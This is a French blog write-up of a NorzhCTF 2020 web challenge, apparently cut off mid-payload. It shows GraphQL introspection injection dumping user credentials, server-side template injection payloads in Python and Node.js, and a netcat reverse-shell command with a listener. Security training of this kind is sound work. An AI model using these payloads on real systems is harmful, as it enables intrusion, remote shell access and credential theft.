<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>Norzh CTF 2020 - Extranet Norzh Nuclea | La sécurité à la française</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noodp" />
<meta name="Description" content="Driikolu, la sécurité à la française"><link rel="next" href="/2020/03/install_arch_chiffre_uefi/" /><link rel="canonical" href="/2020/02/nuclea-web-extranet/" />
<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff"><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Norzh CTF 2020 - Extranet Norzh Nuclea"/>
<meta name="twitter:description" content="En janvier 2020, en marge du FIC, était organisé le NorzhCTF par l&rsquo;ENSIBS. Cette année je ne faisais pas partie des &ldquo;créateurs de challenges&rdquo; mais bien des participants avec mes amis Haax, Razaborg et L0n3w0lf.
Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : Extranet Norzh Nuclea que vous pouvez retrouver sur le git du NorzhCTF.
Énoncé On commence par lire l&#39;énoncé
 Vous avez trouvé l&rsquo;extranet de l&rsquo;entreprise."/>
<script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Norzh CTF 2020 - Extranet Norzh Nuclea",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "\/2020\/02\/nuclea-web-extranet\/"
        },"image": {
                "@type": "ImageObject",
                "url": "\/cover.png",
                "width":  800 ,
                "height":  600 
            },"genre": "posts","wordcount":  2134 ,
        "url": "\/2020\/02\/nuclea-web-extranet\/","datePublished": "2020-02-06T12:07:30\x2b01:00","dateModified": "2020-02-06T12:07:30\x2b01:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
                "@type": "Organization",
                "name": "Driikolu",
                "logo": {
                "@type": "ImageObject",
                "url": "\/logo.png",
                "width":  127 ,
                "height":  40 
                }
            },"description": ""
    }
    </script><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/css/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/css/lib/animate/animate.min.css"></head>
    <body><script>
            window.isDark = (window.localStorage && window.localStorage.getItem('theme')) === 'dark';
            window.isDark && document.body.classList.add('dark-theme');
        </script><div class="wrapper"><nav class="navbar">
    <div class="navbar-container">
        <div class="navbar-header animated bounceIn">
            <a href="/">La sécurité à la française</a>
        </div>
        <div class="navbar-menu"><a class="menu-item" href="/categories/articles" title="">Articles</a><a class="menu-item" href="/categories/writeups" title="">Write-Ups</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/about" title="">À propos</a><a href="javascript:void(0);" class="theme-switch"><i class="fas fa-adjust fa-rotate-180 fa-fw" title="Switch Theme"></i></a>
        </div>
    </div>
</nav><nav class="navbar-mobile">
    <div class="navbar-container">
        <div class="navbar-header">
            <div class="navbar-header-title animated bounceIn">
                <a href="/">La sécurité à la française</a>
            </div>
            <div class="menu-toggle" id="menu-toggle">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="navbar-menu" id="mobile-menu"><a class="menu-item" href="/categories/articles" title="">Articles</a><a class="menu-item" href="/categories/writeups" title="">Write-Ups</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/about" title="">À propos</a><a href="javascript:void(0);" class="theme-switch"><i class="fas fa-adjust fa-rotate-180 fa-fw" title="Switch Theme"></i></a>
        </div>
    </div>
</nav><main class="main">
                <div class="container"><article class="page"><h1 class="post-title animated flipInX">Norzh CTF 2020 - Extranet Norzh Nuclea</h1><div class="post-meta">
            <div class="post-meta-main"><a class="author" href="/" rel="author" target="_blank">
                    <i class="fas fa-user-circle fa-fw"></i>Driikolu
                </a>&nbsp;<span class="post-category">included in&nbsp;<i class="far fa-folder fa-fw"></i><a href="/categories/writeups/">Writeups</a>&nbsp;</span></div>
            <div class="post-meta-other"><i class="far fa-calendar-alt fa-fw"></i><time datetime=2020-02-06>2020-02-06</time>&nbsp;
                <i class="fas fa-pencil-alt fa-fw"></i>about 2134 words&nbsp;
                <i class="far fa-clock fa-fw"></i>11 min&nbsp;</div>
        </div><div class="post-content"><p>En janvier 2020, en marge du FIC, était organisé le NorzhCTF par l&rsquo;ENSIBS. Cette année je ne faisais pas partie des &ldquo;créateurs de challenges&rdquo; mais bien des participants avec mes amis <a href="https://twitter.com/Haaxmax" target="_blank">Haax</a>, <a href="https://twitter.com/razaborg" target="_blank">Razaborg</a> et <a href="https://twitter.com/AzrakelK" target="_blank">L0n3w0lf</a>.</p>
<p>Durant ce CTF, je me suis tout particulièrement occupé d&rsquo;un scénario : <strong>Extranet Norzh Nuclea</strong> que vous pouvez retrouver sur <a href="https://gitlab.com/norzhctf/norzhctf-2020" target="_blank">le git du NorzhCTF</a>.</p>
<h1 id="énoncé">Énoncé</h1>
<p>On commence par lire l'énoncé</p>
<blockquote>
<p>Vous avez trouvé l&rsquo;extranet de l&rsquo;entreprise.</p>
<p>Ce challenge se décompose en 4 parties :</p>
<ul>
<li>Obtenir un accés à l&rsquo;interface administrateur</li>
<li>Obtenir un shell sur la machine</li>
<li>Obtenir un accès root sur la machine</li>
<li>Obtenir le mot de passe de l&rsquo;utilisateur <code>web-dev</code></li>
</ul>
</blockquote>
<p>Globalement, ça ressemble à de l&rsquo;exploitation web puis une privesc système Linux&hellip; C&rsquo;est tout à fait ce que je sais faire, donc on va se lancer.</p>
<h1 id="obtenir-laccès-administrateur">Obtenir l&rsquo;accès administrateur</h1>
<p>Dans un premier temps on va un peu fouiller le site. On a 3 pages :</p>
<ul>
<li>Une page d&rsquo;accueil</li>
<li>Une page de blog</li>
<li>Une page de login</li>
</ul>
<p>La page d&rsquo;accueil ne me semble pas utile, je vais directement voir la page de blog.</p>
<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/Nuclea_blog.png" alt="Page de blog" class="lazyload"><figcaption class="image-caption">Page de blog</figcaption></figure></p>
<p>Ici, ça commence à devenir interéssant. Lorsque l&rsquo;on regarde les liens des <em>blogposts</em> on obtient quelque chose comme ceci :</p>
<blockquote>
<p><a href="http://www.norzh.nuclea/blog/2f6772617068716c3f%5B...%5D6222297b5f6964207469746c6520636f6e74656e747d7d">http://www.norzh.nuclea/blog/2f6772617068716c3f[...]6222297b5f6964207469746c6520636f6e74656e747d7d</a></p>
</blockquote>
<p>Ça me paraît être quelque chose &ldquo;encodé&rdquo; en hexadécimal&hellip; On ouvre donc la console python, et on se fait une petite fonction pour décoder.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">decode_hex</span><span class="p">(</span><span class="nb">hex</span><span class="p">)</span><span class="p">:</span>
    <span class="k">return</span> <span class="sa"></span><span class="s1">&#39;</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">hex</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="nb">hex</span><span class="p">)</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="p">]</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">decode_hex</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">2f6772617068716c3f71756572793d7175657279207b626c6f67706f7374285f69643a2235646632363961323338356538393838356265636234356222297b5f6964207469746c6520636f6e74656e747d7d</span><span class="s2">&#34;</span><span class="p">)</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Et on obtient le résultat suivant :</p>
<blockquote>
<p>/graphql?query=query {blogpost(_id:&ldquo;5df269a2385e89885becb45b&rdquo;){_id title content}}</p>
</blockquote>
<p>C&rsquo;est donc une requête GraphL, on peut le comprendre avec le <em>/graphql</em> et au contenu de <em>query</em>. La requête est sans doute interprétée par le serveur pour nous obtenir le blogpost voulu&hellip; On doit pouvoir faire une injection là dessus.</p>
<a class="post-dummy-target" id="trouver-la-table"></a><h2>Trouver la table</h2>
<p>Je me suis donc un peu renseigné sur le sujet n&rsquo;en ayant jamais fait et je trouve rapidement ce qu&rsquo;il faut faire.</p>
<p>Dans un premier temps, je me refait une petite fonction pour encoder toutes mes requêtes.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b16encode</span>
<span class="k">def</span> <span class="nf">encode_hex</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span><span class="p">:</span>
    <span class="k">return</span> <span class="n">b16encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="s1">/graphql?query=query </span><span class="s1">&#39;</span><span class="o">+</span><span class="nb">str</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="p">)</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="p">)</span> <span class="c1">#encode() et decode() pour gérer les byte-strings</span>
</code></pre></td></tr></table>
</div>
</div><p>La première étape pour obtenir le contenu de la base de données, c&rsquo;est d&rsquo;avoir toutes les tables présentes. En GrapQL ça s&rsquo;obtient avec la requête</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-graphql" data-lang="graphql"><span class="p">{</span><span class="w"> </span><span class="py">__schema</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kd">type</span><span class="nc">s</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="py">name</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>On va encoder tout ça et le mettre dans notre URL.</p>
<blockquote>
<p><a href="http://www.norzh.nuclea/blog/2F6772617068716C3F7175657279%5B...%5DD61207B207479706573207B206E616D65207D207D207D">http://www.norzh.nuclea/blog/2F6772617068716C3F7175657279[...]D61207B207479706573207B206E616D65207D207D207D</a></p>
</blockquote>
<p>Et là on a un blogpost vide&hellip;</p>
<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/Nuclea_post_vide.png" alt="BlogPost vide" class="lazyload"><figcaption class="image-caption">BlogPost vide</figcaption></figure></p>
<p>Pas d&rsquo;inquiétude à avoir, en fait l&rsquo;affichage est traité en js et le retour de notre requête n&rsquo;est pas celui attendu. Donc on a juste à ouvrir les sources de la page.</p>
<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/Nuclea_injection_viewsource.jpg" alt="Source du blogpost" class="lazyload"><figcaption class="image-caption">Source du blogpost</figcaption></figure></p>
<p>On voit bien la table <strong>BlogPost</strong> qui sert à la requête de base, mais nous on va s&rsquo;intéresser à la ble <strong>User</strong>.</p>
<p>Nos requêtes sont les suivantes :</p>
<a class="post-dummy-target" id="trouver-les-colonnes"></a><h2>Trouver les colonnes</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-GraphQL" data-lang="GraphQL"><span class="p">{</span><span class="w"> </span><span class="py">__type</span><span class="p">(</span><span class="py">name</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;User&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nc">name</span><span class="w"> </span><span class="py">fields</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="py">name</span><span class="w"> </span><span class="kd">type</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nc">name</span><span class="w"> </span><span class="py">kind</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>Ici on récupère en plus les types de chaques colonnes</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-GraphQL" data-lang="GraphQL"><span class="p">{</span><span class="s">&#34;__type&#34;</span><span class="p">:</span><span class="w">
</span><span class="w">	</span><span class="p">{</span><span class="w"> 
</span><span class="w">	</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;User&#34;</span><span class="p">,</span><span class="w">
</span><span class="w">	</span><span class="s">&#34;fields&#34;</span><span class="p">:</span><span class="w">
</span><span class="w">		</span><span class="p">[</span><span class="w">
</span><span class="w">			</span><span class="p">{</span><span class="w">
</span><span class="w">			</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;_id&#34;</span><span class="p">,</span><span class="w">
</span><span class="w">			</span><span class="s">&#34;type&#34;</span><span class="p">:</span><span class="w">
</span><span class="w">				</span><span class="p">{</span><span class="w">
</span><span class="w">				</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;String&#34;</span><span class="p">,</span><span class="w">
</span><span class="w">				</span><span class="s">&#34;kind&#34;</span><span class="p">:</span><span class="s">&#34;SCALAR&#34;</span><span class="w">
</span><span class="w">				</span><span class="p">}</span><span class="w">
</span><span class="w">			</span><span class="p">}</span><span class="p">,</span><span class="w">
</span><span class="w">			</span><span class="p">{</span><span class="w">
</span><span class="w">			</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;username&#34;</span><span class="p">,</span><span class="w">
</span><span class="w">			</span><span class="s">&#34;type&#34;</span><span class="p">:</span><span class="w">
</span><span class="w">				</span><span class="p">{</span><span class="w">
</span><span class="w">				</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;String&#34;</span><span class="p">,</span><span class="w">
</span><span class="w">				</span><span class="s">&#34;kind&#34;</span><span class="p">:</span><span class="s">&#34;SCALAR&#34;</span><span class="w">
</span><span class="w">				</span><span class="p">}</span><span class="w">
</span><span class="w">			</span><span class="p">}</span><span class="p">,</span><span class="w">
</span><span class="w">			</span><span class="p">{</span><span class="w">
</span><span class="w">			</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;password&#34;</span><span class="p">,</span><span class="w">
</span><span class="w">			</span><span class="s">&#34;type&#34;</span><span class="p">:</span><span class="w">
</span><span class="w">				</span><span class="p">{</span><span class="w">
</span><span class="w">				</span><span class="s">&#34;name&#34;</span><span class="p">:</span><span class="s">&#34;String&#34;</span><span class="p">,</span><span class="w">
</span><span class="w">				</span><span class="s">&#34;kind&#34;</span><span class="p">:</span><span class="s">&#34;SCALAR&#34;</span><span class="w">
</span><span class="w">				</span><span class="p">}</span><span class="w">
</span><span class="w">			</span><span class="p">}</span><span class="w">
</span><span class="w">		</span><span class="p">]</span><span class="w">
</span><span class="w">	</span><span class="p">}</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>En résumé, nous avons 3 colonnes:</p>
<ul>
<li>_id</li>
<li>username</li>
<li>password</li>
</ul>
<p>On veut, pour avancer, récupérer ces deux dernières.</p>
<a class="post-dummy-target" id="récupérer-les-valeurs"></a><h2>Récupérer les valeurs</h2>
<p>On peut procéder de 2 manières :</p>
<ul>
<li>En requêtant toutes les valeurs de User une à une grâce à l&rsquo;id</li>
<li>En requêtant l&rsquo;ensemble des valeurs de la table User.</li>
</ul>
<p>Étant un partisan du moindre effort, je choisis la seconde option. Et pour ce faire, il &ldquo;suffit&rdquo; de rajouter un <strong>s</strong> à la fin du nom de table.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-GraphQL" data-lang="GraphQL"><span class="p">{</span><span class="w"> </span><span class="py">users</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="py">username</span><span class="p">,</span><span class="w"> </span><span class="py">password</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>On obtient bien la liste de tous les couples <em>username</em>/<em>password</em></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-GraphQL" data-lang="GraphQL"><span class="p">{</span><span class="s">&#34;users&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
</span><span class="w">	</span><span class="p">{</span><span class="w">
</span><span class="w">		</span><span class="s">&#34;username&#34;</span><span class="p">:</span><span class="s">&#34;michelle&#34;</span><span class="p">,</span><span class="w">
</span><span class="w">		</span><span class="s">&#34;password&#34;</span><span class="p">:</span><span class="s">&#34;Michelle1234&amp;__&#34;</span><span class="w">
</span><span class="w">	</span><span class="p">}</span><span class="p">,</span><span class="w">
</span><span class="w">	</span><span class="p">{</span><span class="w">
</span><span class="w">		</span><span class="s">&#34;username&#34;</span><span class="p">:</span><span class="s">&#34;bernard&#34;</span><span class="p">,</span><span class="w">
</span><span class="w">		</span><span class="s">&#34;password&#34;</span><span class="p">:</span><span class="s">&#34;youki1963&#34;</span><span class="w">
</span><span class="w">	</span><span class="p">}</span><span class="p">,</span><span class="w">
</span><span class="w">	</span><span class="p">{</span><span class="w">
</span><span class="w">		</span><span class="s">&#34;username&#34;</span><span class="p">:</span><span class="s">&#34;administrateur&#34;</span><span class="p">,</span><span class="w">
</span><span class="w">		</span><span class="s">&#34;password&#34;</span><span class="p">:</span><span class="s">&#34;ENSIBS{WOW_Such_Big_Credentials}&#34;</span><span class="w">
</span><span class="w">	</span><span class="p">}</span><span class="w">
</span><span class="w"></span><span class="p">]</span><span class="p">}</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>On a donc notre premier flag, et de quoi se connecter avec le compte administrateur.</p>
<h1 id="obtenir-un-shell">Obtenir un shell</h1>
<p>Une fois connecté, on ne me laisse pas trop le choix&hellip; On a juste une page pour créer des blogpost.</p>
<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/Nuclea_connected.png" alt="Page pour créer les blogpost" class="lazyload"><figcaption class="image-caption">Page pour créer les blogpost</figcaption></figure></p>
<p>Ils sont gentils, ils m&rsquo;indiquent tout de suite où regarder : Une &ldquo;Server Side Template Injection&rdquo;.</p>
<p>Je teste comme ils disent le fameux <strong>{7*7}</strong> et en allant voir dans les blogpost, je vois bien mon post avec en contenu <strong>49</strong>.</p>
<p>Pour être honnête, je ne connais que les injections de template via jinja, mon premier reflexe est donc de tenter une injection de code python.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="p">{</span><span class="p">{</span> <span class="p">[</span><span class="p">]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">(</span><span class="p">)</span><span class="p">[</span><span class="mi">92</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">sys</span><span class="s1">&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">os</span><span class="s1">&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">id -a</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="p">)</span> <span class="p">}</span><span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Mais étrangement le bouton ajouter ne fonctionne pas&hellip;</p>
<p>Dans un premier temps j&rsquo;ai pensé à un genre de WAF qui bloquerait des mots-clefs, puis j&rsquo;ai décidé de regarder le code source de la page. On pouvait y voir un code javascript qui gère l&rsquo;envoi de la requête et l&rsquo;affichage de sa réponse.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">)</span><span class="p">.</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="p">)</span><span class="p">{</span>
        <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#submit&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="p">{</span>
          <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">(</span><span class="p">)</span>

          <span class="kd">var</span> <span class="nx">settings</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s2">&#34;async&#34;</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
            <span class="s2">&#34;url&#34;</span><span class="o">:</span> <span class="s2">&#34;/admin&#34;</span><span class="p">,</span>
            <span class="s2">&#34;method&#34;</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
            <span class="s2">&#34;headers&#34;</span><span class="o">:</span> <span class="p">{</span>
              <span class="s2">&#34;content-type&#34;</span><span class="o">:</span> <span class="s2">&#34;application/json&#34;</span>
            <span class="p">}</span><span class="p">,</span>
            <span class="s2">&#34;processData&#34;</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
            <span class="s2">&#34;data&#34;</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="p">{</span>
              <span class="nx">title</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#title&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">val</span><span class="p">(</span><span class="p">)</span><span class="p">,</span>
              <span class="nx">content</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#content&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">val</span><span class="p">(</span><span class="p">)</span>
            <span class="p">}</span><span class="p">)</span>
          <span class="p">}</span>

          <span class="c1">// Send data
</span><span class="c1"></span>          <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">(</span><span class="nx">settings</span><span class="p">)</span><span class="p">.</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">response</span> <span class="o">===</span> <span class="kc">true</span><span class="p">)</span><span class="p">{</span>
              <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Succesfully added blogpost&#39;</span><span class="p">)</span>             
              <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#title&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
              <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#content&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">val</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
              <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Something went bad ...&#39;</span><span class="p">)</span>
            <span class="p">}</span>
          <span class="p">}</span><span class="p">)</span>
        
      <span class="p">}</span><span class="p">)</span>
    <span class="p">}</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Étrangement, on ne rentrait même pas dans le <em>else</em> du test après l&rsquo;envoi de la requête. C'était donc une erreur non prévue par le serveur&hellip; L&rsquo;injection de template n'était donc probablement pas en python.</p>
<p>On essaie d&rsquo;injecter des mots clefs de langages, comme du node.js.</p>
<p>En envoyant un <strong>{ this }</strong>, le blogpost se créé, on va donc voir son contenu.</p>
<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/Nuclea_injected_post.png" alt="Blogpost avec injection" class="lazyload"><figcaption class="image-caption">Blogpost avec injection</figcaption></figure></p>
<p>Bingo, c&rsquo;est du node.js !</p>
<p>Je sais qu&rsquo;on peut exécuter des commandes système avec le code suivant.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;&lt;CMD&gt;&#39;</span><span class="p">)</span> <span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Mais à chaque fois j&rsquo;obtient le résultat <strong>[object Object]</strong>.</p>
<p>J&rsquo;arrête donc d&rsquo;essayer d&rsquo;afficher et je lance un reverse shell. Sur ma machine j&rsquo;ouvre un listener.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">nc -nlvp <span class="m">51337</span>
</code></pre></td></tr></table>
</div>
</div><p>Et je test une première payload sur le serveur.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;nc -e /bin/sh &lt;IP&gt; &lt;PORT&gt;&#39;</span><span class="p">)</span><span class="p">)</span> <span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Malheureusement, ça ne fonctionne pas. Il n&rsquo;y a probablement pas la bonne version de netcat pour ça. Mais pas d&rsquo;inquiétude, on utilise une autre payload qui fonctionne à (presque) tous les coups :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
